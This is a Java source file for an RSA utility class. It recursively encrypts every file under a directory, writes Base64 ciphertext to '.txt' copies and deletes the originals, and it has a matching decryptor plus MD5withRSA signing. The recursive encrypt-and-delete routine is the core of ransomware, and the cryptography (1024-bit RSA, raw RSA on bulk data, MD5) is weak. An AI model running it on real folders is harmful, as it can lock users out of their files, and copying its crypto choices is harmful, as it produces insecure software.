package backend.Encripting_tools;



import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileWriter;
import java.security.*;
import java.security.spec.PKCS8EncodedKeySpec;
import java.security.spec.X509EncodedKeySpec;
import javax.crypto.Cipher;
import java.util.Base64;
import java.util.List;
import java.util.Scanner;


public class Encription {

    private static final int MAX_ENCRYPT_BLOCK = 117;


    private static final int MAX_DECRYPT_BLOCK = 128;


    public static KeyPair getKeyPair() throws Exception {
        KeyPairGenerator generator = KeyPairGenerator.getInstance("RSA");
        generator.initialize(1024);
        return generator.generateKeyPair();
    }


    public static PrivateKey getPrivateKey(String privateKey) throws Exception {
        KeyFactory keyFactory = KeyFactory.getInstance("RSA");
        byte[] decodedKey = Base64.getDecoder().decode(privateKey.getBytes());
        PKCS8EncodedKeySpec keySpec = new PKCS8EncodedKeySpec(decodedKey);
        return keyFactory.generatePrivate(keySpec);
    }


    public static PublicKey getPublicKey(String publicKey) throws Exception {
        KeyFactory keyFactory = KeyFactory.getInstance("RSA");
        byte[] decodedKey = Base64.getDecoder().decode(publicKey.getBytes());
        X509EncodedKeySpec keySpec = new X509EncodedKeySpec(decodedKey);
        return keyFactory.generatePublic(keySpec);
    }

    //Encriptamos los archivos de forma recursiva
    public static void recursiveFileEncryptor(File currentFile, PublicKey publicKey) throws Exception{
        if (currentFile==null)
            return;
        if (!currentFile.exists())
            throw new IllegalArgumentException("File doesnt exist");
        if(!currentFile.isDirectory()){              //Si no es un directorio, encriptar y terminar la rama
            encrypt(currentFile, publicKey);
            return;
        }

        if (currentFile.listFiles()==null)          //Si es un directorio vacio, terminar la rama
            return;
        for (File file: List.of(currentFile.listFiles())){
            recursiveFileEncryptor(file,publicKey);
        }
    }


    public static void recursiveFileDecryptor(File currentFile, PrivateKey publicKey) throws Exception{
        if (currentFile==null)
            return;
        if (!currentFile.exists())
            throw new IllegalArgumentException("File doesnt exist");
        if(!currentFile.isDirectory()){              //Si no es un directorio, encriptar y terminar la rama
            decrypt(currentFile, publicKey);
            return;
        }

        if (currentFile.listFiles()==null)          //Si es un directorio vacio, terminar la rama
            return;
        for (File file: List.of(currentFile.listFiles())){
            recursiveFileDecryptor(file,publicKey);
        }
    }


    private static void encrypt(File files, PublicKey publicKey) throws Exception {
        StringBuilder builder= new StringBuilder("");
        Scanner scanner = new Scanner( files );
        while(scanner.hasNextLine()){
            builder.append(scanner.nextLine());
            if(scanner.hasNextLine()) {
                builder.append('\n');
            }
        }
        String data = builder.toString();
        scanner.close();
        Cipher cipher = Cipher.getInstance("RSA");
        cipher.init(Cipher.ENCRYPT_MODE, publicKey);
        int inputLen = data.getBytes().length;
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        int offset = 0;
        byte[] cache;
        int i = 0;
        // Cifrar segmentos de datos
        while (inputLen - offset > 0) {
            if (inputLen - offset > MAX_ENCRYPT_BLOCK) {
                cache = cipher.doFinal(data.getBytes(), offset, MAX_ENCRYPT_BLOCK);
            } else {
                cache = cipher.doFinal(data.getBytes(), offset, inputLen - offset);
            }
            out.write(cache, 0, cache.length);
            i++;
            offset = i * MAX_ENCRYPT_BLOCK;
        }
        byte[] encryptedData = out.toByteArray();
        out.close();
        // Obtenga contenido cifrado usando base64 para la codificación y conviértalo en una cadena usando UTF-8 como estándar
        // La cadena encriptada
        String encryptedDataString= Base64.getEncoder().encodeToString(encryptedData);
        File newFile= new File(files.getAbsolutePath()+".txt");
        FileWriter fileWriter= new FileWriter(newFile);
        fileWriter.write(encryptedDataString);
        files.delete();
        fileWriter.close();

    }


    private static void decrypt(File file, PrivateKey privateKey) throws Exception {
        StringBuilder builder= new StringBuilder("");
        Scanner scanner = new Scanner( file );
        while(scanner.hasNextLine()){
            builder.append(scanner.nextLine());
            if(scanner.hasNextLine()) {
                builder.append('\n');
            }
        }
        String data = builder.toString();
        scanner.close();
        Cipher cipher = Cipher.getInstance("RSA");
        cipher.init(Cipher.DECRYPT_MODE, privateKey);
        byte[] dataBytes = Base64.getDecoder().decode(data);
        int inputLen = dataBytes.length;
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        int offset = 0;
        byte[] cache;
        int i = 0;
        // Descifrar segmentos de datos
        while (inputLen - offset > 0) {
            if (inputLen - offset > MAX_DECRYPT_BLOCK) {
                cache = cipher.doFinal(dataBytes, offset, MAX_DECRYPT_BLOCK);
            } else {
                cache = cipher.doFinal(dataBytes, offset, inputLen - offset);
            }
            out.write(cache, 0, cache.length);
            i++;
            offset = i * MAX_DECRYPT_BLOCK;
        }
        byte[] decryptedData = out.toByteArray();
        out.close();
        // Contenido descifrado
        String decryptedDataString = new String(decryptedData, "UTF-8");
        String fileNewName= file.getAbsolutePath();
        fileNewName = fileNewName.substring(0,fileNewName.length()-4);  //Sacamos el .txt final
        File newFile = new File(fileNewName);
        FileWriter fileWriter= new FileWriter(fileNewName);
        fileWriter.write(decryptedDataString);
        fileWriter.close();
        file.delete();
    }


    public static String sign(String data, PrivateKey privateKey) throws Exception {
        byte[] keyBytes = privateKey.getEncoded();
        PKCS8EncodedKeySpec keySpec = new PKCS8EncodedKeySpec(keyBytes);
        KeyFactory keyFactory = KeyFactory.getInstance("RSA");
        PrivateKey key = keyFactory.generatePrivate(keySpec);
        Signature signature = Signature.getInstance("MD5withRSA");
        signature.initSign(key);
        signature.update(data.getBytes());
        return new String(Base64.getEncoder().encodeToString(signature.sign()));
    }


    public static boolean verify(String srcData, PublicKey publicKey, String sign) throws Exception {
        byte[] keyBytes = publicKey.getEncoded();
        X509EncodedKeySpec keySpec = new X509EncodedKeySpec(keyBytes);
        KeyFactory keyFactory = KeyFactory.getInstance("RSA");
        PublicKey key = keyFactory.generatePublic(keySpec);
        Signature signature = Signature.getInstance("MD5withRSA");
        signature.initVerify(key);
        signature.update(srcData.getBytes());
        return signature.verify(Base64.getDecoder().decode(sign.getBytes()));
    }

}

